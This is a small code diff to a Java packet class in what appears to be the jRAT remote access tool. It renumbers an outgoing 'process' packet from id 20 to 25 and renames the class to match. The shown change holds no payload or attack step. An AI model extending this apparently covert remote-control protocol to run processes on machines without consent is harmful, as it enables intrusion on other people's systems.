@@ -5,11 +5,11 @@ import java.io.DataOutputStream;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet20Process extends AbstractOutgoingPacket {
+public class Packet25Process extends AbstractOutgoingPacket {
 
 	private String process;
 
-	public Packet20Process(String process) {
+	public Packet25Process(String process) {
 		this.process = process;
 	}
 
@@ -20,7 +20,7 @@ public class Packet20Process extends AbstractOutgoingPacket {
 
 	@Override
 	public byte getPacketId() {
-		return 20;
+		return 25;
 	}
 
 }
